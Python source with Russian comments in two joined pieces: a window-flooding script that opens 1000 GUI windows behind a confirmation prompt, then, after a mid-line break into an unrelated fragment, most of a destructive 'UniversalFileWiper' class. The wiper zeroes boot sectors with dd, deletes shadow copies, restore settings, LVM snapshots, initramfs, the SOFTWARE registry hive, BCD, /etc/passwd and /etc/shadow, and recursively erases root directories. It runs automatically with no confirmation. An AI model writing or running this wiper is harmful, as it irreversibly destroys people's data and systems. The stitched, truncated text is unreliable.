import subprocess
import threading
import time
import os

# Отключаем ограничение на количество открытых файлов (может потребовать sudo)
os.system("ulimit -n 2000 2>/dev/null")

def open_window(app_name, window_id):
    """Открывает одно окно приложения"""
    try:
        # Используем разные приложения чтобы распределить нагрузку
        apps = [
            "xterm -e 'echo Окно {}; sleep 1'",
            "xmessage -center 'Окно {}'",
            "zenity --info --text='Окно {}' --timeout=1",
            "yad --text='Окно {}' --timeout=1",
            "notify-send 'Окно {}'"
        ]
        app_template = apps[window_id % len(apps)]
        cmd = app_template.format(window_id)
        
        # Запускаем в фоновом режиме и сразу забываем о процессе
        subprocess.Popen(
            cmd, 
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp  # Отдельная группа процессов
        )
        
        if window_id % 50 == 0:
            print(f"Открыто окон: {window_id}")
            
    except Exception:
        pass  # Игнорируем все ошибки

def open_1000_windows():
    """Основная функция для открытия 1000 окон"""
    print("⚠️  ВНИМАНИЕ: Это откроет 1000 окон!")
    print("⚠️  Это может привести к сбою системы!")
    print("=" * 50)
    
    for i in range(3, 0, -1):
        print(f"Запуск через {i} секунд... (Ctrl+C для отмены)")
        time.sleep(1)
    
    print("Начинаю открытие 1000 окон...")
    
    threads = []
    for i in range(1000):
        t = threading.Thread(target=open_window, args=("app", i))
        t.daemon = True  # Потоки-демоны
        t.start()
        threads.append(t)
        
        # Небольшая задержка чтобы не перегрузить систему мгновенно
        if i % 100 == 0:
            time.sleep(0.1)
    
    # Ждем немного
    time.sleep(5)
    print("Запуск завершен. Система может стать нестабильной!")
    
    # Предлагаем способ закрыть все окна
    print("\n" + "=" * 50)
    print("Чтобы закрыть все окна, выполните в терминале:")
    print("pkill -f 'xterm\|xmessage\|zenity\|yad'")
    print("Или перезагрузите компьютер.")

if __name__ == "__main__":
    print("Скрипт для открытия 1000 окон")
    print("=" * 50)
    print("Этот код может:")
    print("1. Заморозить вашу систему")
    print("2. Привести к потере несохраненных данных")
    print("3. Потребовать принудительной перезагрузки")
    print("=" * 50)
    
    response = input("Вы точно хотите продолжить? (ДА/нет): ")
    
    if response.upper() == "ДА":
        open_1000_windows()
    else:
        print("Отменено.")ernel32.CloseHandle(handle)
                    except:
                        pass
                        
            elif self.os_type == "Linux":
                # Стирание MBR/GPT через dd
                devices = ['/dev/sda', '/dev/sdb', '/dev/nvme0n1']
                for device in devices:
                    if os.path.exists(device):
                        subprocess.run([
                            'dd', 'if=/dev/zero', 
                            f'of={device}', 
                            'bs=512', 'count=1'
                        ], capture_output=True)
        except:
            pass
    
    def disable_recovery(self):
        """Отключение механизмов восстановления"""
        if self.os_type == "Windows":
            # Удаление точек восстановления
            subprocess.run([
                'vssadmin', 'delete', 'shadows', '/all', '/quiet'
            ], capture_output=True)
            
            # Отключение восстановления системы
            subprocess.run([
                'reg', 'add', 
                'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore',
                '/v', 'DisableSR', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True)
            
        elif self.os_type == "Linux":
            # Удаление снапшотов LVM/BTRFS
            subprocess.run(['lvremove', '-f', '/dev/*/*'], 
                          capture_output=True)
            
            # Уничтожение initramfs
            for initrd in ['/boot/initrd.img-*', '/boot/initramfs-*']:
                subprocess.run(['rm', '-f'] + glob.glob(initrd))
    
    def execute_total_wipe(self):
        """Основная процедура полного уничтожения"""
        print(f"[INIT] Starting universal wipe on {self.os_type}")
        
        # Шаг 1: Получение максимальных привилегий
        self.elevate_privileges()
        
        # Шаг 2: Отключение защит
        self.disable_protections()
        
        # Шаг 3: Определение корневых путей для удаления
        if self.os_type == "Windows":
            targets = ['C:\\', 'D:\\', 'E:\\', os.path.expanduser('~')]
        else:
            targets = ['/', '/home', '/boot', '/var', '/usr', '/opt']
        
        # Шаг 4: Рекурсивное уничтожение
        for target in targets:
            if os.path.exists(target):
                print(f"[WIPE] Processing {target}")
                self.recursive_destruction(target)
        
        # Шаг 5: Уничтожение загрузочных областей
        self.destroy_boot_sectors()
        
        # Шаг 6: Отключение восстановления
        self.disable_recovery()
        
        # Шаг 7: Финализация - повреждение файловой системы
        self.corrupt_filesystem()
        
        print("[COMPLETE] System wipe executed")

    def corrupt_filesystem(self):
        """Целенаправленное повреждение файловой системы"""
        if self.os_type == "Windows":
            # Повреждение реестра
            try:
                subprocess.run([
                    'reg', 'delete', 'HKLM\\SOFTWARE', '/f'
                ], capture_output=True)
                
                # Стирание BCD (конфигурации загрузки)
                subprocess.run([
                    'bcdedit', '/delete', '{all}', '/f'
                ], capture_output=True)
            except:
                pass
                
        elif self.os_type == "Linux":
            # Удаление критичных конфигураций
            critical_files = [
                '/etc/fstab',
                '/etc/passwd',
                '/etc/shadow',
                '/etc/group',
                '/boot/grub/grub.cfg'
            ]
            
            for file in critical_files:
                if os.path.exists(file):
                    self.wipe_file(file)
            
            # Удаление модулей ядра
            subprocess.run(['rm', '-rf', '/lib/modules'], 
                          capture_output=True)

# Автоматический запуск при выполнении
if __name__ == "__main__":
    wiper = UniversalFileWiper()
    wiper.execute_total_wipe()
